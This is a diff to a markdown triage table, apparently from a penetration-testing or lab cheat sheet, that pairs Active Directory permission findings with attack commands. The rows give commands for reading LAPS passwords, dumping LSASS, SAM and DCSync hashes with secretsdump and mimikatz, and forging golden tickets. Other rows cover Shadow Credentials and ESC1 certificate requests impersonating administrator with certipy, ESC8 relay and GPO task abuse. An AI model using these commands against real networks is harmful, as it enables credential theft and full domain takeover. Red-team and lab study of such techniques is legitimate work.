@@ -32,7 +32,10 @@ This matrix is designed for rapid triage. When you see a specific "indicator" or
 | **ReadLAPSPassword** | `netexec smb 10.10.10.10 -u [ME] -p [PASS] --laps` | Get Local Administrator credentials |
 | **HasSession (on Target)** | `impacket-secretsdump` or `mimikatz` (if admin) | Extract credentials from LSASS/SAM |
 | **Bidirectional Trust** | **Golden Ticket + Extra SIDs**: `kerberos::golden ... /sids:[PARENT]-519` | Escalate to Parent Enterprise Admin |
-| **GenericWrite (GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
+| **GenericWrite (on User)** | **Shadow Credentials**: `certipy shadow auto` | Impersonate User via Certificate |
+| **GenericWrite (on GPO)** | Inject "Immediate Task" via `gpmc.msc` or `SharpGPOAbuse` | Local/Domain Admin via Group Policy |
+| **BloodHound: ESC1** | `certipy req ... -upn administrator` | Full Domain Admin via Certificate |
+| **CA Server (Port 80/443)** | **ESC8**: Relay SMB/RPC to CA Web Enrollment | Computer/User Impersonation |
 | **DCSync Rights** | `impacket-secretsdump -just-dc [DOMAIN]/[USER]:[PASS]@DC` | Dump ALL Domain Hashes |
 
 ---
